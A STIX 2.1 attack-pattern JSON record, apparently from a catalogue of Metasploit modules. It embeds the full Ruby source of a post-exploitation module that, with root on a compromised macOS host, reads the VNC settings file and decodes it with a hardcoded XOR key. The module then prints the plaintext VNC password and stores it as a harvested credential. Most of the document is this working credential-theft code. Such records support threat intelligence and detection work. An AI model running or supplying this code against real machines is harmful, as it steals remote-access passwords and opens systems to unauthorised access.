{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--776bf157-174e-4c3c-935e-66ec2110291e",
    "created": "2024-08-14T16:33:00.705041Z",
    "modified": "2024-08-14T16:33:00.705045Z",
    "name": "OS X Display Apple VNC Password",
    "description": " This module shows Apple VNC Password from Mac OS X High Sierra.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/osx/gather/vnc_password_osx.rb",
            "external_id": "vnc_password_osx.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::OSX::Priv\n  include Msf::Post::File\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'OS X Display Apple VNC Password',\n        'Description' => %q{\n          This module shows Apple VNC Password from Mac OS X High Sierra.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [ 'Kevin Gonzalvo <interhack[at]gmail.com>'],\n        'Platform' => [ 'osx' ],\n        'SessionTypes' => [ 'meterpreter', 'shell' ]\n      )\n    )\n  end\n\n  def decrypt_hash(hash)\n    if hash.nil? || hash.empty?\n      return nil\n    end\n\n    aux = ['1734516E8BA8C5E2FF1C39567390ADCA'].pack('H*')\n    fixedkey = aux.unpack('C*')\n\n    str_pw = [hash.to_s].pack('H*')\n    array_pwd = str_pw.unpack('C*')\n    str = ''\n\n    for data in fixedkey\n      str += (data ^ array_pwd.shift).chr\n    end\n    return str.delete(\"\\0\")\n  end\n\n  def run\n    unless is_root?\n      fail_with(Failure::NoAccess, 'Root privileges are required to read VNC password file')\n    end\n    print_status('Checking VNC Password...')\n    vncsettings_path = '/Library/Preferences/com.apple.VNCSettings.txt'\n    passwd_encrypt = read_file(vncsettings_path.to_s)\n    final_passwd = decrypt_hash(passwd_encrypt.to_s)\n    if !final_passwd.nil?\n      print_good(\"Password Found: #{final_passwd}\")\n      pass_file = store_loot('osx.vnc.password', 'text/plain', session, final_passwd, 'passwd.pwd', 'OSX VNC Password')\n      print_good(\"Password data stored as loot in: #{pass_file}\")\n      credential_data = {\n        origin_type: :session,\n        session_id: session_db_id,\n        post_reference_name: fullname,\n        private_type: :password,\n        private_data: final_passwd.to_s,\n        workspace_id: myworkspace_id\n      }\n      create_credential(credential_data)\n    else\n      print_error('Password not found')\n    end\n  end\nend\n",
    "x_mitre_platforms": [
        "[ 'osx' ]"
    ]
}